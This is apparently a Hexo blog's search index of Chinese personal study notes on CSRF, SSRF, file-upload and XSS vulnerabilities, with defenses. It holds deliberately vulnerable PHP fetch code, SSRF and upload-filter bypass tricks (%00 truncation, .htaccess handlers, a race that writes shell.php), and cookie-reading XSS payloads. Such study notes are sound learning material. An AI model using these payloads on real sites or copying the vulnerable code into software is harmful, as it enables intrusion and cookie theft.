<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>代码演示</title>
      <link href="/2022/10/07/%E4%BB%A3%E7%A0%81%E5%9D%97%E6%BC%94%E7%A4%BA/%E6%BC%94%E7%A4%BA/"/>
      <url>/2022/10/07/%E4%BB%A3%E7%A0%81%E5%9D%97%E6%BC%94%E7%A4%BA/%E6%BC%94%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<p>‘’’<br>file_get_content<br><?phpif (isset($_POST['url'])) { $content = file_get_contents($_POST['url']); $filename ='./images/'.rand().';img1.jpg’; file_put_contents($filename, $content); echo $_POST['url’]; $img = "<img src=\"".$filename."\"/>"; } echo $img; ?></p><p>fsockopen<br>&lt;?php</p><p>function GetFile($host, $port, $link)<br>{<br>    &#x2F;&#x2F;fsockopen() 将返回一个文件句柄，之后可以被其他文件类函数调用<br>    &#x2F;&#x2F;（例如： fgets() ， fgetss() ，<br>    &#x2F;&#x2F; fwrite() ， fclose() 还有 feof() ）。如果调用失败，将返回 FALSE 。<br>    $fp &#x3D; fsockopen($host, intval($port), $errno, $errstr, 30);<br>    if (!$fp) {<br>        echo “$errstr (error number $errno) \n”;<br>    } else {<br>        $out &#x3D; “GET $link HTTP&#x2F;1.1\r\n”;<br>        $out .&#x3D; “Host: $host\r\n”;<br>        $out .&#x3D; “Connection: Close\r\n\r\n”;<br>        $out .&#x3D; “\r\n”;<br>        fwrite($fp, $out);<br>        $contents &#x3D; ‘’;<br>        while (! feof($fp)) {<br>            $contents .&#x3D; fgets($fp, 1024);<br>        }<br>        fclose($fp);<br>        return $contents;<br>    }<br>}<br>$host &#x3D; $_GET[‘host’];<br>$port &#x3D; $_GET[‘port’];<br>$link &#x3D; $_GET[‘link’];</p><p>curl_exec<br><?php if (isset($_POST['url'])){$link = $_POST['url’];$curlobj = curl_init();curl_setopt($curlobj, CURLOPT_POST, 0);curl_setopt($curlobj,CURLOPT_URL,$link);curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($curlobj);curl_close($curlobj);$filename = './curled/'.rand().'.txt’;file_put_contents($filename, $result); echo $result;}?></p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/08/12/hello-world/"/>
      <url>/2022/08/12/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CSRF-个人笔记</title>
      <link href="/2020/01/07/CSRF/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
      <url>/2020/01/07/CSRF/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="CSRF-1"><a href="#CSRF-1" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">挟制用户在当前已登录的Web应用程序上执行非本意的操作,即攻击者盗用了你的某个网站身份,以你的名义发送恶意请求</span><br><span class="line">发邮件,发信息,财产操作,转账或者购买商品等</span><br></pre></td></tr></table></figure><h3 id="CSRF流程"><a href="#CSRF流程" class="headerlink" title="CSRF流程"></a>CSRF流程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户在浏览器上登录了信任的网站A,并在浏览器中保存了相应cookie,再不退出网站A的情况下访问了恶意网站B,恶意网站B伪造用户身份,进行恶意操作</span><br></pre></td></tr></table></figure><h3 id="CSRF—GET-x2F-POST"><a href="#CSRF—GET-x2F-POST" class="headerlink" title="CSRF—GET&#x2F;POST"></a>CSRF—GET&#x2F;POST</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">把请求操作改为POST请求并不能防止CSRF:</span><br><span class="line">1.服务器端在请求时候未严格区分GET和POST请求,攻击者依然可以用GET请求表单提交地址</span><br><span class="line">2.使用了$_REQUEST请求,其既可以接收GET请求也可以接收POST请求</span><br><span class="line">3.在攻击界面构造form表单,用js自动提交表单</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="CSRF挖掘"><a href="#CSRF挖掘" class="headerlink" title="CSRF挖掘"></a>CSRF挖掘</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">冒充身份:订阅/关注/转发/投票</span><br><span class="line">账户接管:密码修改,邮箱绑定,第三方关联</span><br><span class="line">其他:登录/注册/注销</span><br></pre></td></tr></table></figure><h3 id="CSRF漏洞防御"><a href="#CSRF漏洞防御" class="headerlink" title="CSRF漏洞防御"></a>CSRF漏洞防御</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.关键操作增加验证码</span><br><span class="line">2.验证referer</span><br><span class="line">3.使用token</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF-个人笔记</title>
      <link href="/2020/01/07/SSRF/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
      <url>/2020/01/07/SSRF/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="SSRF-1"><a href="#SSRF-1" class="headerlink" title="SSRF"></a>SSRF</h2><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者构造形成由服务端发送请求的一个安全漏洞,一般情况下,SSRF攻击的目标是从外网无法访问的内部系统.</span><br></pre></td></tr></table></figure><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web应用提供了从其他服务器获取数据的功能,例如使用用户指定的url,web应用获取图片,下载文件,读取文件内容等.这个功能被恶意使用,可以利用存在缺陷的web应用作为代理攻击远程和本地服务器.服务器提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制.</span><br></pre></td></tr></table></figure><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.可以对外网服务器所在的内网,本地进行端口扫描,获取服务banner信息 (可以获取到软件开发商、软件名称、服务类型、版本号)</span><br><span class="line">2.攻击运行在内网或者本地的应用程序</span><br><span class="line">3.通过访问默认文件实现,对内网web应用进行指纹识别</span><br><span class="line">4.攻击内外网的web应用,sql注入,struct2,redis等</span><br><span class="line">5.利用file协议读取本地文件等</span><br></pre></td></tr></table></figure><h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_content</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&#x27;url&#x27;])) &#123; </span><br><span class="line">$content = file_get_contents($_POST[&#x27;url&#x27;]); </span><br><span class="line">$filename =&#x27;./images/&#x27;.rand().&#x27;;img1.jpg’;</span><br><span class="line"> file_put_contents($filename, $content); </span><br><span class="line">echo $_POST[&#x27;url’]; </span><br><span class="line">$img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">echo $img; </span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">fsockopen</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function GetFile($host, $port, $link)</span><br><span class="line">&#123;</span><br><span class="line">    //fsockopen() 将返回一个文件句柄，之后可以被其他文件类函数调用</span><br><span class="line">    //（例如： fgets() ， fgetss() ，</span><br><span class="line">    // fwrite() ， fclose() 还有 feof() ）。如果调用失败，将返回 FALSE 。</span><br><span class="line">    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);</span><br><span class="line">    if (!$fp) &#123;</span><br><span class="line">        echo &quot;$errstr (error number $errno) \n&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $out = &quot;GET $link HTTP/1.1\r\n&quot;;</span><br><span class="line">        $out .= &quot;Host: $host\r\n&quot;;</span><br><span class="line">        $out .= &quot;Connection: Close\r\n\r\n&quot;;</span><br><span class="line">        $out .= &quot;\r\n&quot;;</span><br><span class="line">        fwrite($fp, $out);</span><br><span class="line">        $contents = &#x27;&#x27;;</span><br><span class="line">        while (! feof($fp)) &#123;</span><br><span class="line">            $contents .= fgets($fp, 1024);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);</span><br><span class="line">        return $contents;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$host = $_GET[&#x27;host&#x27;];</span><br><span class="line">$port = $_GET[&#x27;port&#x27;];</span><br><span class="line">$link = $_GET[&#x27;link&#x27;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl_exec</span><br><span class="line">&lt;?php </span><br><span class="line">if (isset($_POST[&#x27;url&#x27;]))&#123;</span><br><span class="line">$link = $_POST[&#x27;url’];</span><br><span class="line">$curlobj = curl_init();</span><br><span class="line">curl_setopt($curlobj, CURLOPT_POST, 0);</span><br><span class="line">curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($curlobj);curl_close($curlobj);</span><br><span class="line">$filename = &#x27;./curled/&#x27;.rand().&#x27;.txt’;</span><br><span class="line">file_put_contents($filename, $result);</span><br><span class="line"> echo $result;&#125;?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="SSRF漏洞挖掘"><a href="#SSRF漏洞挖掘" class="headerlink" title="SSRF漏洞挖掘"></a>SSRF漏洞挖掘</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.web功能查找--&gt;访问页面观察页面加载的东西例如图片,是否是我们浏览器去请求的</span><br><span class="line">2.url地址分享网页内容</span><br><span class="line">3.转码服务--&gt;通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</span><br><span class="line">4.在线翻译--&gt;通过 URL地址翻译对应文本的内容。提供此功能的百度、有道等</span><br><span class="line">5.图片加载与下载：通过 URL地址加载或下载图片</span><br></pre></td></tr></table></figure><h4 id="SSRF验证"><a href="#SSRF验证" class="headerlink" title="SSRF验证:"></a>SSRF验证:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.抓包--&gt;SSRF是服务端发起的请求,在加载图片是时,本地浏览器不应该存在该图片的请求</span><br><span class="line">2.验证此URL是否可以来请求对应的内网地址。首先我们要获取内网存在HTTP服务且存在favicon.ico文件地址，才能验证是否是SSRF。内网地址可以通过从漏洞平台中的历史漏洞寻找泄露的内网地址</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="SSRF绕过"><a href="#SSRF绕过" class="headerlink" title="SSRF绕过"></a>SSRF绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.限制为http://www.xxx.com 域名</span><br><span class="line">采用http基本身份认证的方式绕过。即@</span><br><span class="line">http://www.xxx.com@www.xxc.com</span><br><span class="line">@：</span><br><span class="line">http://www.baidu.com@10.10.10.10与http://10.10.10.10 请求是相同的</span><br><span class="line"></span><br><span class="line">。:</span><br><span class="line">http://127.0.0.1与http://127 。 0 。 0 。 1 ,中文句号绕过,两个请求是相同的</span><br><span class="line"></span><br><span class="line">2.限制请求IP不为内网地址,当不允许ip为内网地址时</span><br><span class="line">（1）采取短网址绕过</span><br><span class="line">  短网址绕过:</span><br><span class="line">http://tool.chinaz.com/tools/dwz.aspx?qq-pf-to=pcqq.group</span><br><span class="line"></span><br><span class="line">（2）采取特殊域名</span><br><span class="line"> Xip.io</span><br><span class="line">127.0.0.1.xip.io  --&gt;127.0.0.1</span><br><span class="line">www.127.0.0.1.xip.io   --&gt;127.0.0.1</span><br><span class="line">Haha.127.0.0.1.xip.io  --&gt;127.0.0.1</span><br><span class="line">Haha.xixi.127.0.0.1.xip.io  --&gt;127.0.0.1</span><br><span class="line">（3）采取进制转换</span><br><span class="line"> IP地址转换成十进制：</span><br><span class="line"> 127.0.0.1=2130706433  16进制也是可行的</span><br><span class="line"> http://www.ab126.com/system/2859.html</span><br><span class="line"></span><br><span class="line">3.限制请求只为http协议</span><br><span class="line">（1）采取302跳转</span><br><span class="line">（2）采取短地址</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="SSRF防御"><a href="#SSRF防御" class="headerlink" title="SSRF防御"></a>SSRF防御</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.统一错误信息，避免用户可以根据错误信息来判断远程服务器端口状态</span><br><span class="line">2.限制请求的端口为HTTP常用的端口，比如 80,443,8080,8088等 </span><br><span class="line">3.黑名单内网IP</span><br><span class="line">4.禁用不需要的协议，仅仅允许HTTP和HTTPS.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传-个人笔记</title>
      <link href="/2020/01/07/UPLOAD/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0--%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/01/07/UPLOAD/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0--%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB-文件上传"><a href="#WEB-文件上传" class="headerlink" title="WEB-文件上传"></a>WEB-文件上传</h1><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="轻量级的检测绕过攻击"><a href="#轻量级的检测绕过攻击" class="headerlink" title="轻量级的检测绕过攻击"></a>轻量级的检测绕过攻击</h3><p>绕过javascript对后缀的检测</p><p>绕过服务端对http request包的MIME类型的检测</p><p>绕过文件内容幻数头的检测 </p><h3 id="路径-x2F-扩展名检测绕过"><a href="#路径-x2F-扩展名检测绕过" class="headerlink" title="路径&#x2F;扩展名检测绕过"></a>路径&#x2F;扩展名检测绕过</h3><h4 id="判断上传方式"><a href="#判断上传方式" class="headerlink" title="判断上传方式"></a>判断上传方式</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断黑白名单上传 ----&gt;&gt;改为不存在的后缀判断回显结果,成功的上传即是黑名单,反之白名单</span><br></pre></td></tr></table></figure><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><h5 id="特殊文件名"><a href="#特殊文件名" class="headerlink" title="特殊文件名"></a>特殊文件名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(基于windows系统特性) </span><br><span class="line">. . . . (点空格点)    ::$DATA  大小写(Php pHp)    </span><br><span class="line">windows对大小写不敏感以及默认自动会去除文件名后有空格和点的文件后缀</span><br><span class="line">(基于代码层面)  </span><br><span class="line">双写(phphpp)  特殊文件名绕过(php2) </span><br></pre></td></tr></table></figure><h5 id="黑名单列表绕过"><a href="#黑名单列表绕过" class="headerlink" title="黑名单列表绕过"></a>黑名单列表绕过</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">上传黑名单外的可被解析的后缀(.cer)</span><br></pre></td></tr></table></figure><h5 id="00绕过"><a href="#00绕过" class="headerlink" title="%00绕过"></a>%00绕过</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%00  php版本5.3以下  </span><br><span class="line">上传路径可控时,在路径后加目标文件,接着用%00截断</span><br><span class="line">如: ./upload/33.php%00</span><br></pre></td></tr></table></figure><h5 id="htaccess-文件攻击"><a href="#htaccess-文件攻击" class="headerlink" title=".htaccess 文件攻击"></a>.htaccess 文件攻击</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">作为局部变量作用文件成功的前提条件: </span><br><span class="line">(httpd.exe)开启:</span><br><span class="line">1.Allow Override All</span><br><span class="line">2.LoadModule rewrite_module modules/mod_rewrite.so</span><br><span class="line"></span><br><span class="line">.htaccess---&gt;haha.png   </span><br><span class="line">上传.htaccess文件的内容,内容里定义后头上传的文件,可被解析成相应文件.</span><br><span class="line">(&lt;FilesMatch &quot;haha&quot;&gt;           </span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt; /FilesMatch&gt;)</span><br></pre></td></tr></table></figure><h5 id="多文件上传–条件竞争"><a href="#多文件上传–条件竞争" class="headerlink" title="多文件上传–条件竞争"></a>多文件上传–条件竞争</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原因:服务器允许先上传,之后再对不合格的文件检测和修改.</span><br><span class="line">只要新建文件的速度比删除的的速度快就可以成功上传目标文件.</span><br><span class="line">操作:</span><br><span class="line">1.上传的文件包含如下代码(file_put_contents(&#x27;shell.php&#x27;,&#x27;&lt;?php phpinfo(); ?&gt;&#x27;);)---&gt;&gt;新建一个内容为&#x27;&lt;?php phpinfo(); ?&gt;&#x27;的shsll.php文件.</span><br><span class="line">2.抓上传文件的包和访问文件的包进行爆破 </span><br></pre></td></tr></table></figure><h5 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apache解析漏洞</span><br><span class="line">IIS解析漏洞</span><br><span class="line">Nginx解析漏洞</span><br></pre></td></tr></table></figure><h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%00  php版本5.3以下  </span><br><span class="line">上传路径可控时,在路径后加目标文件,接着用%00截断</span><br><span class="line">如: ./upload/33.php%00</span><br></pre></td></tr></table></figure><h5 id="PHP文件包含漏洞"><a href="#PHP文件包含漏洞" class="headerlink" title="PHP文件包含漏洞"></a>PHP文件包含漏洞</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP中引发文件包含漏洞的通常是以下四个函数：</span><br><span class="line">1、include()当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</span><br><span class="line">2、include_once()功能和include()相同，区别在于当重复调用同一文件时，程序只调用一次。</span><br><span class="line">3、require()只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息，并且终止脚本的运行</span><br><span class="line">4、require_once()它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次</span><br></pre></td></tr></table></figure><h5 id="解析漏洞-1"><a href="#解析漏洞-1" class="headerlink" title="解析漏洞:"></a>解析漏洞:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IIS解析漏洞</span><br><span class="line">Nginx解析漏洞</span><br></pre></td></tr></table></figure><h5 id="Put协议上传"><a href="#Put协议上传" class="headerlink" title="Put协议上传"></a>Put协议上传</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器开启put方法，我们不需要任何的代码支持，直接就可以上传文件</span><br></pre></td></tr></table></figure><h4 id="中间件解析漏洞详解"><a href="#中间件解析漏洞详解" class="headerlink" title="中间件解析漏洞详解"></a>中间件解析漏洞详解</h4><h5 id="Apache未知拓展名解析漏洞"><a href="#Apache未知拓展名解析漏洞" class="headerlink" title="Apache未知拓展名解析漏洞"></a>Apache未知拓展名解析漏洞</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件名test.php.aaa.bbb.ccc----&gt;&gt;Apache从后往前依次读取能解析的拓展名</span><br><span class="line">test.php.xxxx----&gt;&gt;test.php</span><br></pre></td></tr></table></figure><h5 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IIS6</span><br><span class="line">目录解析漏洞  test.asp/1.jpg  </span><br><span class="line">目录后缀以: .asp .asa .cer .cdx 结尾,其目录下的所有文件都会当成.asp后缀的文件</span><br><span class="line"></span><br><span class="line">文件名解析漏洞   xxx.asp;.jpg</span><br><span class="line">文件名后缀中有: .asp;   .asa;   .cer;   .cdx; 优先按asp来解析</span><br></pre></td></tr></table></figure><h4 id="Nginx解析漏洞-IIS-7-0-x2F-IIS7-5-Nginx-lt-8-0-3"><a href="#Nginx解析漏洞-IIS-7-0-x2F-IIS7-5-Nginx-lt-8-0-3" class="headerlink" title="Nginx解析漏洞(IIS 7.0 &#x2F; IIS7.5  Nginx&lt;8.0.3)"></a>Nginx解析漏洞(IIS 7.0 &#x2F; IIS7.5  Nginx&lt;8.0.3)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1./任意文件名.php解析漏洞 </span><br><span class="line">对于任意文件名，在后面添加/xxx.php（xxx为任意字符）后,即可将文件作为php解析</span><br><span class="line">原文件名test.jpg----&gt;&gt;test.jpg/x.php</span><br><span class="line">2.低版本Ngin--&gt;&gt;%00.php解析攻击</span><br><span class="line">(windows)上传一个waf白名单内的1.jpg扩展名文件----&gt;1.jpg%00.php进行进行请求</span><br><span class="line">(linux)  上传一个waf白名单内的1.jpg扩展名文件----&gt;1.jpg%20%00.php进行进行请求</span><br></pre></td></tr></table></figure><h3 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.将上传文件目录的所有用户的执行权限取消</span><br><span class="line">2.随机数改写文件名路径名,增加攻击者攻击成本</span><br><span class="line">3.服务端文件名内容扩展检测</span><br><span class="line">文件幻数检测(jpg(JFIF) gif(GIF89a) png(%PNG))</span><br><span class="line">文件相关信息检测(文件头加一些图片信息中间夹杂攻击代码)</span><br><span class="line">文件加载检测(调用API或者函数进行文件加载测试  php的gd库)</span><br><span class="line">4.单独设置文件服务器,设置执行权限可读可写不可执行</span><br><span class="line">5.二次渲染,将上传的图片重新保存为一个图片,将里面的可执行代码删除</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS-个人笔记</title>
      <link href="/2020/01/07/XSS/XSS--%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/01/07/XSS/XSS--%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="XSS-1"><a href="#XSS-1" class="headerlink" title="XSS"></a>XSS</h2><p>跨站脚本攻击</p><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对用户提交的数据不过滤或者过滤不严谨,拼接然后执行了用户输入的恶意JS代码.</span><br></pre></td></tr></table></figure><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">盗取用户或者管理员cookie,电子邮件钓鱼,网站挂马,网页键盘记录,获取浏览器的明文密码等</span><br></pre></td></tr></table></figure><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">评论区,留言板,搜索框,订单信息等</span><br></pre></td></tr></table></figure><h4 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(同域名|IP、同端口、同协议)</span><br><span class="line">保护a.com域名下的资源不被来自其他网页的脚本读取或者篡改.</span><br></pre></td></tr></table></figure><h4 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;-----   &lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;input&gt; -----   &lt;input onfocus=&quot;alert(document.cookie)&quot;&gt;</span><br><span class="line">&lt;details&gt;-----&lt;details ontoggle=&quot;alert(document.cookie)&quot;&gt;</span><br><span class="line">&lt;svg&gt;------&lt;svg onload=&#x27;alert(&quot;xss&quot;)&#x27;&gt;</span><br><span class="line">&lt;img&gt;  ------    &lt;img src=&quot;x&quot; onerror=alert(document.cookie)&gt;</span><br><span class="line">&lt;select&gt; ----- &lt;select onfocus=alert(document.cookie)autofocus&gt;</span><br><span class="line">&lt;iframe&gt; -----   &lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;link&gt; -------   &lt;link rel=&quot;stylesheet&quot; href=&quot;x&quot; onerror=alert(document.cookie)&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">源码:&lt;input name=&quot;user&quot; type=&quot;text&quot;  value=&lt;?php  echo @$_GET[&#x27;text&#x27;];?&gt; &gt;</span><br><span class="line">闭合:?text=&gt;&lt;script&gt;alert`1`&lt;/script&gt;&lt;</span><br><span class="line">源码:&lt;textarea&gt;&lt;?php  echo @$_GET[&#x27;text&#x27;];?&gt;&lt;/textarea&gt;</span><br><span class="line">闭合:闭合: &lt;/textarea&gt; &lt;script&gt;alert`1`&lt;/script&gt; &lt;textarea&gt;</span><br><span class="line">源码:function domxss()&#123;</span><br><span class="line">       var str = document.getElementById(&quot;text&quot;).value;</span><br><span class="line">       document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#x27;&quot;+str+&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;;</span><br><span class="line">       &#125;</span><br><span class="line">     闭合: &#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">          &#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;</span><br></pre></td></tr></table></figure><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h4 id="反射型XSS-非持续型"><a href="#反射型XSS-非持续型" class="headerlink" title="反射型XSS(非持续型)"></a>反射型XSS(非持续型)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XSS代码通过url参数或者请求发送给服务器,服务器处理完接收参数将其返回给响应的html,浏览器解析执行了该XSS代码.</span><br><span class="line"></span><br><span class="line">利用过程:构造有恶意代码的短连接--&gt;用户点击--&gt;XSS代码被提交到有xss漏洞的web应用程序--&gt;web应用程序没有过滤--&gt;web应用程序输出提交的数据--&gt;用户浏览器渲染返回的HTML页面,执行返回的js代码--&gt;恶意的js代码在后台悄悄运行,获取用户信息.</span><br></pre></td></tr></table></figure><h4 id="存储型XSS-持续型"><a href="#存储型XSS-持续型" class="headerlink" title="存储型XSS(持续型)"></a>存储型XSS(持续型)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">存储到服务器数据库</span><br></pre></td></tr></table></figure><h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当js代码执行去改变页面元素的时候会导致恶意代码被执行</span><br><span class="line">代码审计篇：</span><br><span class="line">location.hash   location.search   document.referer  innerHTML</span><br><span class="line">indexOf   document.getElementById</span><br><span class="line">防御方法：</span><br><span class="line">主要是检查输入的地方，和会发生dom型xss的函数</span><br></pre></td></tr></table></figure><h4 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h4><figure class="highlight 